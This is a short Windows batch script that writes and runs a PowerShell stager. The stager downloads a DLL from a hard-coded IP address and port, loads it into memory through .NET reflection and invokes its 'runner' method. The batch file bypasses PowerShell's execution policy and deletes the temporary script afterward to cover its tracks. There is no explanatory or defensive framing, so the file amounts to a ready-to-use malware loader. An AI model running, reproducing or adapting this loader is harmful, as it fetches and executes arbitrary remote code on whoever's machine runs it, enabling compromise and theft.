@echo off

echo $data = (New-Object System.Net.WebClient).DownloadData('http://51.21.94.205:4445/Clib1.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('Clib1.Class1');$method = $class.GetMethod('runner');$method.Invoke(0, $null) > temp.ps1

powershell -ExecutionPolicy Bypass -File temp.ps1

del temp.ps1

pause